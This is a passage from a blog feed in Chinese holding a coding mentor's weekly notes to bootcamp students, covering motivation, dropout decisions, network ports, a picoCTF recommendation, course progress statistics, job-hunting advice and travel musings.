就不會被淘汰</p><p>關於這個計畫，我覺得自己心態上的轉變也很重要<br>我希望你們能學到的不只有程式，而是可以順便學一些其他的（雖然我也不知道其他有什麼）<br>例如說原本的目標可能是轉職，但跟一跟發現自己不太可能在時間內轉職<br>這時如果還是維持目標，只會越跟越覺得自己做不到，一有拖延就無限責怪自己<br>這樣子只會越來越拖延，然後離目標越來越遠<br>若是你華麗地轉身做一個心態上的調整，把目標設定為學會寫程式<br>或者是學會寫一個自己的作品出來<br>在時間內轉職的壓力就瞬間變不見了！bang！<br>然後你就會有動力繼續跟課，也能夠繼續寫作業<br>而且這樣跟到最後，搞不好還是成功轉職了！<br>心態上的轉變就是這麼神奇</p><p>建議大家可以花點時間去外面散個步，邊散步邊想自己的目標要訂什麼<br>可以不用管這個計畫原本的目標，那些放水流就可以了<br>自己想要什麼才是最重要的，不要管別的</p><p>接著來分享一下一個我自己快樂過生活的小撇步<br>那就是你必須找到一件短期內你期待的事情，這個事情就會成為你往前的動力<br>最常見的就是出國玩<br>「哇，下個月要出國玩」、「哇，下禮拜要出國玩」<br>因為你知道自己之後要出國玩，所以就會有動力繼續過生活繼續往前<br>發生什麼不如意的事情，就可以對自己說：「沒關係，反正我下個月就要出國玩了」<br>就會覺得有種生命十分美好的感覺，因為前面會有美好的事</p><p>像我自己最近比較期待的事是過幾天要跟一個每半年見一次的朋友吃飯<br>每次大概都怒聊個三四個小時吧，是很聊得來的朋友<br>是很令人期待的一件事</p><p>所以大家可以主動來創造這種期待的事<br>例如說約朋友在一個月後吃飯（？），或者是報一個未來的活動之類的<br>就幫自己在未來訂下一件期待的事，生活就會有了動力</p><p>最後來分享兩個最近在聽的東西</p><p>第一個是我一直被洗腦的東西：<a href="https://www.youtube.com/watch?v=bMhq9dXZ_jI">https://www.youtube.com/watch?v=bMhq9dXZ_jI</a><br>第二個是可以一直放著輪播的，會播到一堆類似的 beats，最近都在聽這種無人聲的 beats：<a href="https://www.youtube.com/watch?v=jEYT0p2-cws">https://www.youtube.com/watch?v=jEYT0p2-cws</a></p><h4 id="第十八週"><a href="#第十八週" class="headerlink" title="第十八週"></a>第十八週</h4><p>### 其一</p><p>上週跟了一個老朋友吃飯。</p><p>我們見面的頻率大約為每半年至一年一次，她說她很習慣好像每次考試到一個段落就會見到我。吃飯時聊一聊才突然想起來，從我認識她的時候她就是學生了，一直到現在還是；而我則是完全相反，一直都在工作。</p><p>其實半年這頻率我覺得挺好的，既不多也不少，一次更新半年的近況不用怕沒話聊，也不需畏懼分享任何事情——反正下次見面都是半年後的事了。</p><p>她說她以前很期待出去交換的，但最近卻興趣缺缺，比較希望能快點脫離學生生活出去工作。是啊，她應該很嚮往另外一種不同的生活吧，畢竟當學生這麼久了，雖然有在外面實習，但跟真正工作還是不一樣。我說我覺得下次見面時搞不好我們就黃金交叉了，妳出去工作，換我變成持續休息的狀態。</p><p>我跟她分享了前陣子去旅遊時一直在想的事情，分享了原本從日本回來後想要去日本工作的規劃，分享了後來又是如何重新燃起了閉關修煉的想法，以及準備面試時想玩的訂閱制。她分享了分組報告被中國人雷的故事，一門很重的課碰到一個來玩的交換生，甚至前一天才答應老師要改東西，後一天就交換結束飛回去了，留下一堆爛攤子。</p><p>之前六月就跟她分享了一些那時的煩惱，說詳細之後見面再聊。總覺得跟她聊完之後可以把想法整理得更清楚，內心也會更平靜一點。至於這些煩惱到底是什麼，我以後會寫一篇文章跟大家分享，文章標題會是：「或許有一天，我會歸隱山林」。</p><p>### 其二</p><p>這一週把精力全部放在寫 session &amp; cookie 三部曲了。</p><p>其實這系列醞釀大概三四個月了，卻遲遲沒有下筆。原因是我看完 rfc 以後還是沒有很理解 session 是什麼，在不敢完全肯定的情況下我不願意動筆。在寫文章的前幾天我還在我臉書 po 文問了朋友的意見，雖然沒有茅塞頓開的感覺，但還是得到了不少幫助。</p><p>後來會開始寫，第一是因為有時間壓力，TechBridge 那邊又輪到我寫文章了；第二是因為再不寫可能就不會寫了，就算是自己沒有完全確定的情況下也沒關係，就先寫出來吧，把自己的疑慮也寫進去就沒問題了。</p><p>話說這系列文的靈感其實是從第三篇先開始的。</p><p>故事是這樣的，之前在幫 ALPHACamp 做一個專案時，有些人誤以為 sessionID 跟使用者的帳號或是 id 有關，例如說把 id 做 sha-1 之類的就變成 sessionID，我就直接說不是這樣，那是隨機產生的。可是我自己覺得我必須證明這件事，否則就永遠只是「我認為是這樣，但證據我拿不出來」。</p><p>於是我就去找了 express-session 的 source code，發現的確是隨機產生，也順便找了 rails 的，意外發現 rails 居然是用 cookie-based session。當下就覺得這主題很有趣，有天一定要寫下來。</p><p>就這樣，就有了第三篇的想法。後來看到同學們 session 理解卡的很嚴重就有了第一篇的想法，自己研究時碰到問題就有了第二篇，後來就變成三部曲了。以後搞不好還會多兩篇變成五部曲之類的，一個想寫大型系統的 session 怎麼管理，一個想寫 cookie 的安全性問題。</p><p>### 其三</p><p>感謝 yakim-shu 同學，幫助我完成了第二十周要給大家玩的小遊戲。</p><p>這次的遊戲比較特別，是要優化這個網站：<a href="https://github.com/Lidemy/lazy-hackathon">lazy hackathon</a>，大家有興趣可以先去看看。</p><p>我們刻意做出了一個很慢的網站，然後要請大家優化。</p><p>會想做這個是因為之前忘記在哪邊看到有學生說要優化網站好難，而且從來沒有經驗。我就想說：「沒經驗，就自己創造吧！」，就有了這個 idea，刻意做一個網站來優化。雖然說真實世界的網站會長的更複雜，但至少也是一次有趣的練習。</p><p>### 其四</p><p>希望這週能把二十週以後的前端課程稍微整理一下，第一個是資源目前很亂，第二個是最後兩週的作業我還沒準備好，因為有可能會想多教一個 jwt(json web token) 之類的，我就要重新再寫 code 然後再錄影片，會花點時間，我會再想一下是不是必要的。</p><p>另外一方面 React 的課程大概是 16.3，現在已經 16.9 了而且多了新的東西，連 create-react-app 都升了一個版本，概念絕對可以沿用，但不確定影片裡的專案跑不跑得起來，之後要再檢查一下。</p><p>第三期課程只要把這邊搞定，我的部分應該就全部搞定了，課程部份就全都完成了。</p><p>### 其五</p><p>話說我九月初要去香港轉機，但以最近的狀況感覺變數很大。原本我轉機時間刻意留很長，想說可以去香港找朋友吃個飯，但朋友也說最好再觀望一陣子。</p><p>以下文字引用自：<a href="https://medium.com/%E6%88%91%E6%98%AF%E9%A6%AC%E4%B8%96%E8%8A%B3/pray-for-hk-43db9bdb140">要是可以，誰不想歲月靜好</a>：</p><blockquote><p>想像一下警察在捷運東門站裡面放催淚彈，在忠孝復興站一面暴打掃射一面把人群推落長長的手扶梯，年輕人和警察在西門町行人徒步區展開巷戰，電影街瀰漫毒煙。</p></blockquote><blockquote><p>想像一下黑道在大橋頭站持棍群毆下班回家的民眾和同學，警察在公館天橋朝羅斯福路的人群狂射催淚彈胡椒彈和布袋彈。</p></blockquote><blockquote><p>然後想像一下深夜總統開電視記者會，譴責群眾抗爭傷害民主精神，支持警察嚴厲執法。市民被抓了幾百個，許多人監禁幾天還見不到律師，動武的警察和黑道都沒事，沒有人知道他們的名字。</p></blockquote><blockquote><p>面對今日香港抗爭，明年台灣大選，義憤填膺、氣急敗壞、滿心焦慮，為的不過就是我們的小日子而已。我們並沒有要併吞誰，也不想與誰為敵，只想把自己日子過好。</p></blockquote><blockquote><p>要實現這卑微的願望，竟亦如此艱難</p></blockquote><p>happy learning, happy coding</p><h4 id="第十九週"><a href="#第十九週" class="headerlink" title="第十九週"></a>第十九週</h4><p>這週我淘汰了五個人。</p><p>有兩個是符合淘汰規則所以淘汰掉的<br>都有其他事情在忙所以沒辦法撥出時間在這個計畫上</p><p>另外三個的狀況比較特別，是我動用這次計畫裡面的特殊規則淘汰掉的</p><p>特殊規則指的是儘管沒有符合淘汰條件，但我認為沒有在跟課，所以還是可以淘汰掉。</p><p>這三個同學進度報告都有符合標準，兩週內都沒有累積缺交三次<br>但是作業的部分就不一樣了<br>上一次交作業是五月份的事情…對，三個月前<br>憑著這點我就把他們淘汰掉了，因為三個月實在是太久了<br>儘管有寫進度報告（雖然內容都差不多）<br>但三個月沒交作業，我實在很難相信他們真的有在跟課</p><p>如同我之前說過的一樣<br>我覺得淘汰並不是一件壞事，因為當初已經說過要花一定時間在這計畫上了<br>如果你當初答應了而且跑來報名，但現在又沒辦法花時間在上面<br>就代表你一定在做你覺得更重要的事情<br>兩邊都想兼顧的話通常只會兩頭空<br>請先專注在一件事情上，搞定了再來想其他事情</p><p>剛開始計畫有 62 人，現在淘汰 14 人剩下 48 人<br>計畫進行了四個月，還有兩個月可以學習，兩個月可以找工作</p><p>之前有人問我說，最後能順利找到工作的都是怎樣的學生，有沒有什麼特質<br>我回答了：「有，那就是堅持吧」<br>只要能夠持續進步並且把課跟完，就能夠找得到工作<br>但堅持本來就是一件很不容易的事<br>我鼓勵大家繼續跟課，但我從來都不想強迫大家<br>我也很討厭那種沒頭沒尾的精神喊話<br>像是「大家一定可以的！」、「千萬不能放棄啊！」</p><p>我比較實事求是一點<br>我不知道你可不可以，只有你自己知道，但我希望你可以<br>沒什麼不能放棄的，只要想清楚就行了<br>要不要放棄是你自己的決定，你想清楚了我都沒意見，但我希望你能繼續跟下去<br>重點是你要幫自己找到堅持下去的理由<br>你寫程式寫到現在有沒有寫出興趣？有沒有找到樂趣？<br>如果有的話，或許你就有了一個堅持下去的理由</p><p>大家有空的話也可以回頭去找一下自己當初寄給我的報名信<br>看看四個月前的自己是怎麼想的<br>因為你有可能在這四個月當中已經逐漸迷失自己（？）而忘記了當初的自己<br>「莫忘初衷」四個字送給大家</p><p>可以把課綱看成一道道的關卡，每五關為一個單位<br>只要過完一關，你就有複習週可以休息，也離課程的終點越來越近<br>只要過完四次複習週，就快要到達終點了<br>每一次的複習週就是課程的 20%，大多數人都已經到了第二個複習週<br>也就是說課程已經完成快一半了<br>這整個計畫包含求職時間其實是八個月<br>如果能夠繼續跟著課程，在年底的時候就能把課程完成，一樣也可以出去求職<br>只要能把課程跟完，我相信就能找到工作<br>畢竟有些人沒跟完都找到工作了 XD</p><p>講到這個，若是你有求職的壓力或是想早點出去試試水溫<br>只要你進度在第九週以後，我覺得都可以投履歷去試試看<br>反正沒有損失嘛，頂多就是沒人找你面試或是面試完被電而已<br>但電一電之後可能會給你更多進步的動力，也讓你知道哪邊可以再加強<br>搞不好還真的誤打誤撞碰到有公司願意用你，那還真的是賺到<br>（雖然薪水可能會低一點就是了）</p><p>總之就是這樣啦，祝大家天天開心（好突然的結尾）</p><h4 id="第二十二週"><a href="#第二十二週" class="headerlink" title="第二十二週"></a>第二十二週</h4><p>（二十一週跳過，二十二週在講機票票規也跳過）</p><p>這週我們先來點技術相關的話題好了<br>要確認大家知道到底什麼是 port，台灣翻作連線埠，中國翻端口<br>首先，大家都知道 ip 位置嘛，基本上就可以當作一台電腦的地址<br>例如說我在網址列上輸入某 ip 位置，就可以連到對應的網站<br>但這邊其實瀏覽器有偷偷幫你做好一些事情<br>例如說你連線到 <a href="http://3.3.3.3/">http://3.3.3.3</a> 的時候，其實是連到 3.3.3.3:80<br>後面那個  :80 就是 80 port 的意思，是 http 預設的 port<br>為什麼要有 port 呢？因為一台電腦上可能會有不同的服務嘛<br>每個服務都需要有一個 port，去接收自己的資料，不然會互相衝突</p><p>MySQL 預設的 port 是 3306<br>所以當你在 php 連線到 3.3.3.3 的時候，其實是連線到 3.3.3.3:3306<br>php 也知道預設的 port 是 3306，所以才不用特別做設定<br>再舉一個例子，你如果網址打 ptt.cc，會連到一個 ptt 的網站<br>那是因為這是 ptt.cc:80<br>平常真正連 ptt 的 port 其實是 23 port，才會真的連線到 ptt 那個論壇</p><p>然後再回到課程相關的部分<br>主進度到那邊這個就不用太在意了<br>維持住自己的進度，一直有在往前走就好，其他都不是那麼重要<br>現在這個學習系統，後端是用 Express + Sequelize<br>前端是用 React + Redux<br>如果你不知道這些是什麼沒關係，二十四週上完之後全都會學到<br>為了讓大家更有感覺加上有東西可以參考<br>我把程式碼整理了一下，前後端程式碼在這邊：</p><p><a href="https://github.com/Lidemy/lidemy-learning-backend">https://github.com/Lidemy/lidemy-learning-backend</a><br><a href="https://github.com/Lidemy/lidemy-learning-frontend">https://github.com/Lidemy/lidemy-learning-frontend</a></p><p>把上面提到的東西學一下之後可以來參考這些程式碼<br>應該多少會有一些幫助</p><p>好，再講回旅遊的部分<br>我現在身在法國巴黎，一個時區 +2 的地方<br>目前最喜歡的是天氣，已經入秋了，甚至有點台灣冬天的感覺<br>好喜歡這種天氣阿<br>遊記我都分享在鐵人賽的文章裡面了：<a href="https://ithelp.ithome.com.tw/users/20091346/ironman/2621">後設鐵人</a><br>以後就不會特地在這邊再分享一次了，這樣好累<br>不過歐洲遊真的是個考驗，無論是行程規劃還是自身安危（？）<br>我真的很怕被偷或是被搶 &#x3D; &#x3D;<br>但我怕的不是財物損失，是麻煩<br>如果能用台幣兩千塊換一次不被搶之類的那我很願意</p><p>我決定以後在歐洲出門都要走一種運動風，讓別人以為我是出來運動的<br>帶個手機、信用卡跟大概二十塊歐元<br>要搶我的話也沒什麼東西可以搶<br>而且運動風的話應該一臉就是沒帶什麼錢的樣子<br>聽起來很不錯</p><p>最後再講回課程<br>之前已經有跟大家稍微說過了，如果你想把作業當作作品集拿出去的話<br>請先把作業做得精緻一點  </p><p>留言板的話規模其實也偏小，要做大不太容易<br>建議直接用 php 改做上面那種個人 blog 之類的比較好<br>原理其實都是一樣的，但 blog 看起來就比較厲害<br>以作業本身來說，幾乎沒有一個是你做完就可以拿去放在履歷上的<br>作業只是最低標準而已</p><p>然後關於進度的部分<br>如果你已經進度落後然後又卡關嚴重<br>可以思考一下是不是現在的學習模式不適合你<br>卡關的那些時間其實都比較像是浪費掉，自己瞎摸索<br>這時候主動求助同學或老師可能是比較好的選項，而不是自己亂找<br>一來節省時間，二來也能確定自己有往正確的方向走<br>隨時歡迎在 slack 的 channel 提問<br>如果私訊我覺得不太好意思（？）的話，很多熱心的同學應該也很樂意幫你解惑</p><p>這週想說的大概就是這樣<br>happy coding, happy learning!</p><h4 id="第二十三週"><a href="#第二十三週" class="headerlink" title="第二十三週"></a>第二十三週</h4><p>開頭先來祝大家中秋節快樂～</p><p>先跟大家分享一些比較有趣的事好了<br>跟學習沒什麼關係的</p><p>第一件事情是我看完奇幻自衛隊跟殺人回憶了！<br>前者其實之前在台灣要出國前就看完了<br>覺得還不錯啦，簡直是日本自衛隊的宣傳片…<br>後者想看很久了，在犯罪的部分跟索命黃道帶有點像<br>不過我覺得又有講到更多東西就是了<br>例如說憑證據或是憑直覺辦案</p><p>第二件事情跟學習有點相關<br>最近被 YouTube 推薦這個影片：<a href="https://www.youtube.com/watch?v=nF3tSkNWRVQ">ICPC 2018 World Finals stream with tourist and Endagorion</a></p><p>ICPC 是大學的程式比賽，比的都是資料結構演算法那些題目<br>要從區域賽一路打才能打到 world finals<br>只要有進到 world finals 好像都會被 Google 找去面試<br>能到這個程度，要去工作通常都沒什麼問題</p><p>但重點不是這個，重點是想跟大家介紹 tourist 這個人<br>直接附兩篇文章：<a href="https://buzzorange.com/techorange/2015/09/29/coding-jordan/">簡直是 Coding 界的麥可喬丹，21 歲少年把全世界 coding 大賽全贏光</a>]、<a href="https://www.zhihu.com/question/26701017">tourist 是否已经是史上最强的算法竞赛选手？</a></p><p>總之就是程式競賽界的神人，超神的那種<br>程式競賽真的滿好玩的啊，之前我記得我有說過想要來辦<br>實體的好玩很多，會真的有比賽的感覺，只是不知道會有多少人想參加就是了  ?<br>有意願的可以喊一下，讓我先做個調查</p><p>第四件也跟學習有關係<br>之前看到 it 鐵人賽有人分享這個網站：<a href="https://2018game.picoctf.com/">https://2018game.picoctf.com/</a><br>我玩了一整個下午…好好玩喔</p><p>先來講一下什麼是 CTF，全名是 Capture the flag<br>flag 其實就像是我們之前第五週第十週玩的小遊戲那樣，是一個密碼<br>你要根據提示找出這個密碼，就獲勝了<br>而這個 picoCTF 是 CMU 寫給美國的高中生玩的<br>是個剛好適合大家的程度<br>難度從最簡單的到很難的都有<br>非常推薦大家有時間可以去玩玩看，真的很好玩<br>不知道從何開始的話再來私訊我<br>也可以看一下這篇：<a href="https://ithelp.ithome.com.tw/articles/10215346">https://ithelp.ithome.com.tw/articles/10215346</a><br>不過我玩的不是那個遊戲，我是直接點 problems 去解題</p><p>話說不是寫給美國高中生嗎？為什麼會剛好適合大家呢？<br>因為對本來就有在接觸這個領域的高中生來說，程度一定比大家好啊<br>而且我敢說程度還會比沒有在接觸這個領域的工程師還好<br>舉例來說，我是高中生的時候對演算法&#x2F;資料結構的理解也比一大堆非本科轉職的工程師好啊<br>這也滿正常的，因為那些人沒有碰過嘛，但我有<br>所以輸給高中生很正常，真的很正常</p><p>然後我也要來分享一下自己拖延症的心得<br>最近真的是，拖延到爆<br>原本有滿多事情想做但都處於拖著的狀態<br>例如說之前一直想把 NET101 那個傳紙條故事寫成文章，但還沒<br>或者是整理一下之後自己想學的東西，但也還沒<br>還有想說 it 鐵人賽要不要多報一個主題<br>想要來寫「跟我一起讀 RFC」或是「更好的 JS 面試題」之類的<br>但想一想還是算了，東西都還沒準備好<br>而且人在國外很多東西不可控，應該滿麻煩的<br>這些文章就留在自己 blog 好了</p><p>還有一個很想研究的主題擱置了<br>之前跟一個同學說要寫的 react router url 的事情也還沒寫…QQ</p><p>唯一沒有拖的大概是我終於把歐洲行的交通跟住宿搞定了<br>再找個時間把一些機票跟車票印出來就完事了，讚讚讚</p><p>喔對了，歡迎大家有問題就跑來問我<br>這樣會讓我覺得自己至少有做點事<br>不然一直看 YouTube 廢片真的有點太廢嗚嗚</p><p>課程的部分，進入到二十三週了<br>幫大家再複習一次 timeline<br>結業日期（過六個月）是 10&#x2F;15，正好一個月<br>也就是說大家已經開始學程式五個月了<br>計畫截止日期是 12&#x2F;15，其實還有三個月<br>在這時間點內求職成功都會被視為成功<br>所以時間感覺滿充裕的（？）</p><p>等再過兩個月，十一月的時候，會希望如果你進度有到第九週之後就出去找工作試試看<br>因為如果我不推這把，可能很多人就不會去找工作了 XDD<br>但目標不是找到工作，而是去面試看看，練個經驗，之後學習起來才會更有動力<br>至少你會更清楚之後要怎麼走</p><p>大家繼續加油～<br>fighting ～</p><p>最後分享一首德文歌好了，雖然我還沒到德國<br>以前在學德文的時候隨意找的<br>Silbermond — Ja：<a href="https://www.youtube.com/watch?v=iRs56yxg3sw">https://www.youtube.com/watch?v=iRs56yxg3sw</a></p><h4 id="第二十四週"><a href="#第二十四週" class="headerlink" title="第二十四週"></a>第二十四週</h4><p>這週跟大家聊點不一樣的好了，聊一些最近曾有過的想法<br>不過要先聲明一下，在我腦中的想法本來就很多，但去想跟去做還是兩回事</p><p>不知道大家是怎麼看我的<br>但以我自己的角度來看，我一直覺得自己是個做事情半吊子的人<br>我心目中一直都有個「做到那樣會很好」的藍圖，但從未達成過<br>以 Lidemy 來說，教學影片質量可以再更好，範例程式碼可以一起附上<br>每週結束之後可以針對當週的作業做檢討以及常見問題（用影片而非現在用文字）<br>還可以針對重點概念再做一次教學<br>在前期教 CSS 的時候排版可以再講多一點<br>後期教 React 的時候可以再慢一點，作業可以再出的好一點<br>這些不用任何人提醒，我自己就知道</p><p>我前年在鐵人賽寫的主題：<a href="https://ithelp.ithome.com.tw/users/20091346/ironman/1150">Half-Stack Developer 養成計畫</a>也是半吊子系列作<br>如果說我心目中的那個樣子是 90 分，這些實際產出的成果就都只有 70 分<br>好像還行，但你又不能說它好</p><p>明明就知道可以怎樣做但又不去，這到底是個什麼心態呢？<br>很簡單啊，就是拖延，拖著拖著就這樣子了<br>所以我一直跟大家說我很懂拖延的那種感覺，真的不是隨意唬爛的<br>講了這麼多，其實我想強調的是：「我知道 Lidemy 可以變成什麼樣子，可以怎樣從現在的 60 分到 80 分，但是我懶得做」<br>對，我懶得做，有誰能比我懶！</p><p>再來跟大家提一下很久以前說過的第四期的事<br>再次強調，這還不是定論，是我目前最新的想法<br>想法是會變的，先跟大家說只是在分享我此時此刻的想法而已<br>以目前的想法來說，第四期是不會有的<br>會變成第三期導讀那個課程開放去賣，想要跟課程的就導讀跟線上課程都買一買就可以跟了<br>只是作業的部分我還要想要怎麼辦，學習系統也是<br>突然覺得好麻煩喔…</p><p>不開的理由很簡單，我有別的更想做的事<br>之前忘記有沒有跟大家提過，我明年想閉關一年<br>就像是讀書準備考試那種閉關，每天在家唸書然後準備考試<br>換成程式就是每天學程式，準備一年之後的面試，中途順便做其他自己想做的事<br>就算是我，也是有很多需要學的，很多需要補的基礎</p><p>之前我自己想到一個思想實驗（哲學系很喜歡問這個）很有趣<br>「如果有一天你不工作就有跟工作一樣的收入，你會想做什麼？」<br>換個方法問就是，如果你不必依靠工作就能繼續過著現在的生活，你會想做什麼？<br>這問題的答案，我覺得是你「真正的興趣」</p><p>如果答案是程式，就代表你是真心很喜愛寫程式這件事，而不只把它當成工作<br>但我的答案不是<br>但也不能說我不愛寫程式，可能就只是沒那麼愛吧，除了寫程式以外還有其他想做的<br>至於答案是什麼，我沒有打算講 XD</p><p>總之呢，我想給自己一年做一些自己想做的事<br>也想利用這一年把拖了好幾年的一些問題給解決<br>例如說七八年前就該學好的演算法與資料結構 QQ<br>但目前最大的擔憂大概就是會不會拖延症又犯了<br>所以還在想辦法評估並解決這個問題</p><p>如果最後真的這樣做了，那就代表這一年間應該會很少拋頭露面（？）<br>教學可能就直接暫停一年，專心做自己想做的事情<br>一年以後再以全新的自己跟大家見面</p><p>不過這些也還在想而已，詳細的形式還沒確定<br>要等我玩完回台灣之後才會有定論<br>這趟旅遊也順便利用一些閒暇時間來想這些事情<br>畢竟旅遊最容易進入發散模式了，很適合想東想西</p><p>最後來談談跟課程有關的部分<br>有些人以為前面學了這麼多基礎，到框架就會變得很容易<br>沒有，千萬不要這樣以為，框架還是很不容易<br>但前面學的基礎的確是為了框架鋪路，因為如果沒有前面那些，框架你根本學不起來<br>或者是你學起來了，但不知道為什麼要學</p><p>想要碰框架變得很容易，你就必須先熟練某一個框架<br>這就像是以大家現在的基礎如果去學個 Ruby 或 Python，應該不會覺得太難<br>因為你已經學過兩個程式語言了，會發現程式語言概念都是類似的<br>框架也是如此，所以你必須先掌握一兩個</p><p>再來談談求職的部分，之前跟大家說過我對這一期信心爆棚<br>但我現在修正一下好了，我覺得應該是對「找到工作」覺得沒什麼問題<br>可是對於薪資的部分我就不知道了<br>因為我在想，會不會軟體業現在是走一種「很容易找到但薪水不容易談高」的路線<br>來給個範例好了，例如說今天自學完有 60 分，然後表現好的同學有 80 分<br>可是職缺的分數要求是 50~80，就代表說無論你是 50 還是 80，都是同個缺<br>既然是同個缺，薪水應該也不會差太多</p><p>那要怎樣才能拿到高薪？可能要 85 或 90 分<br>就是說要嘛表現真的很優異，要嘛就是有個半年一年工作經驗<br>我只是在擔心這件事，但還不確定是不是這樣<br>等之後有修完課程的同學們出去找工作的時候可以再留意看看</p><p>總之無論如何，我都很期待大家出去找工作啦<br>最喜歡的就是聽大家的面試分享了，畢竟就是聽故事嘛<br>聽學生拿到 offer 的時候我自己也會滿興奮的，也替你們感到開心</p><p>好，這週的隨意聊就到這邊<br>那我也要睡啦</p><h4 id="第二十五週"><a href="#第二十五週" class="headerlink" title="第二十五週"></a>第二十五週</h4><p>沒想到已經十月初了，而且日程已經來到表定的二十四週的尾聲<br>意思就是依據主進度，這一週應該要把所有的課程都結束掉，把一切作業給寫完</p><p>那實際上有多少人達成呢？ 1、2、3，三人！（完了會不會大家不懂這個三原梗）</p><p>提出這個數字是要告訴大家有達成進度的人是少數中的少數，沒有達成進度也不需要灰心</p><p>之前就跟大家說過了，我覺得重點是你有沒有持續在前進<br>只要有在前進，就會一天天成長。進度什麼的可以拋諸於腦後，其實沒這麼重要</p><p>雖然說這計畫從中段開始就一直走一個佛系路線<br>老師本人我好像比各位同學都還淡定，不太擔心求職狀況什麼的<br>但畢竟時程表已經到尾聲了，還是要來跟大家同步一下課程狀況</p><p>這幾週有一個同學因病退出<br>另一個同學發現自己比較喜歡 UI&#x2F;UX 所以想往這方面走<br>但還是希望能留在這課程裡，不過之後的統計數據裡面會把她當作已退出<br>也歡迎有任何對畫面有需求的同學找她合作，你的 project 就能有美美的畫面了</p><p>目前的同學一共 45 人，進度如下：</p><p>21<del>24 週：14 人<br>16</del>20 週：9 人<br>11<del>15 週：10 人<br>06</del>10 週：12 人</p><p>進度其實還滿平均的，幾乎就是切成四等份平均散落於各五週<br>先來講一下各五週代表的意涵<br>1<del>5 就是基礎，包含 Git、CMD、JS 以及網路基礎<br>6</del>10 是前端基礎外加一點點後端<br>11<del>15 是後端基礎，重心完全放在後端，後半部會有前後端整合（ajax）<br>16</del>20 是前端工具以及 JS 核心概念，後半段又是前後端整合<br>21~24 則是前後端框架，是你以後出去工作比較有可能用到的東西</p><p>其中的精華其實我覺得是 16~20，這一段銜接的教材補足了很多知識<br>因為很多其他課程都直接忽略這段，可能從第 9 週東西學完之後就直接跳 21 週的框架<br>中間這段反而是我覺得最重要的，跳過之後你會完全不知道 21 週在幹嘛<br>雖然說就算你中間有學，你一開始也不一定知道 21 週在幹嘛，但一定慢慢能體會<br>它其實就是前面這麼多週以來學到的東西的總結與歸納<br>是前人流血流汗之後創造出來的智慧結晶（好啦這樣有點太誇張）</p><p>計畫的求職截止日會是 12 月中，離現在還有兩個半月<br>如果想在截止日以前找到工作，那就是兩個月內要開始投履歷<br>客觀來看，進度在 16 週之後的 23 人都很有希望達成這個目標<br>所以希望最後這期的求職成功率可以達到 50%</p><p>進度在這之後的 22 人也不用灰心，根據這期一些同學的資料<br>就算沒有跟完課程還是有機會找到工作<br>所以希望大家如果在 12 月以前進度有到 15 週之後<br>都可以嘗試看看去投履歷找找看工作<br>反正沒有錄取也沒損失，賺到面試經驗，錄取就賺到工作<br>無論如何都是賺到</p><p>再來分享一個學習小訣竅，那就是動手做<br>剛好最近被另一個引路人計劃的同學問到一個演算法問題<br>是我以前一直逃避沒學的東西（因為聽說很難）<br>但被問了也只好硬著頭皮去看一下，發現找到的資料都頗難懂<br>看一看之後稍微有個感覺，但不懂原理也不懂為什麼可以這樣<br>接著我就實際動手，拿出紙筆開始一步步推敲，看看這演算法每個步驟在幹嘛<br>試了幾遍之後發現有更理解箇中奧妙，接著開始隨意寫一些 code，發現比較懂了<br>然後再去看一次文章就發現更看得懂了，就再回去自己想<br>所以學習本來就是手腦並用，你想一下之後試著寫點程式碼，至少看懂那一行在幹嘛就好<br>就這樣來來回回，總有一天會懂的</p><p>就像我當初剛學 React + Redux 的時候也是啊<br>覺得 Redux 那是三小，怎麼那麼複雜？流程圖我看過四五遍還是看不懂啊<br>但有一天就跟著官方文件一步一步來，每個流程都跑過一遍<br>然後開始依樣畫葫蘆，試著模仿做出一個新的功能<br>這時候再回去看流程圖，發現居然能夠理解了！<br>就這樣反反覆覆多個幾次，就知道 Redux 到底在幹嘛了</p><p>前幾天六角辦了同學會，有一個六角的助教有分享他那天回答的問題：<a href="https://hsiangfeng.github.io/learnexp/20190930/236119363/">被車輪戰的六角同學會</a><br>裡面有針對：「學習上卡關」跟「目標達不到」這兩個問題做回覆，我覺得很棒，大家都可以去看一下</p><p>這邊幫大家稍微摘要，「卡關最主要問題是『沒有將功能拆出來做』，假設有 ABCD 四個功能，你在思考的時候可能是 一次在想這四個功能怎麼做，但是其實這就是最主要問題，你應該將功能一個一個切離出來，一次只思考一個功能該如何製作，做完 A 再去做 B」</p><p>當你在學習寫程式時，你在學的絕對不只有程式，還有「學習如何學習」<br>而且這套技能是可以帶著走的<br>像我學程式這麼久，找到一個學習方法之後，總感覺順利很多<br>至少在自信上面變多不少<br>以前是「怎麼辦我學不會」，現在是「我一定學得會，但要給我時間」<br>連帶影響到我覺得學其他東西好像也類似<br>有信心的話其實就先贏一半了，但這信心需要建立在你已經精通某樣東西的基礎之上</p><p>所以我其實滿喜歡看大家進度報告寫到調整學習方法<br>因為滿多人可以從這過程中找到適合自己的方法<br>例如說寫筆記啦，整理成關鍵字啦，多方搜集資源啦等等<br>適合自己的方法就是好方法，反之亦然<br>如果你試過肌肉學習法發現很好用，那我也不會反對你用</p><p>接著底下是一些跟學習比較無關的事</p><p>前天跟一個學工業設計的朋友吃飯<br>聊著聊著他就突然說到他們公司用很多參數式設計<br>我就驚覺：咦？這不就是之前 minw 同學提過的東西嗎<br>瞬間有種很巧的感覺</p><p>他說這個最早從建築開始用的另一個原因是省錢<br>例如說現在有個房子，能不能在一樣堅固的情形底下節省建材？<br>最後電腦算出來就會有一些奇形怪狀，人腦根本無法想像到的樣子<br>但以工程的角度來說可能實用度是一樣的，但建材可能節省了 50%，就少了一半的錢<br>聽起來真的很酷</p><p>這週的隨意聊就到這邊<br>希望我能趕快到一個 wifi 穩定的地方然後直播 XD</p><p>下集傳送門：&#x2F;2020&#x2F;01&#x2F;12&#x2F;weekly-note-part3-87969dd50929&#x2F;</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫隨意聊總集</title>
      <link href="/2019/12/27/weekly-note-part1-197335682a61/"/>
      <url>/2019/12/27/weekly-note-part1-197335682a61/</url>
      
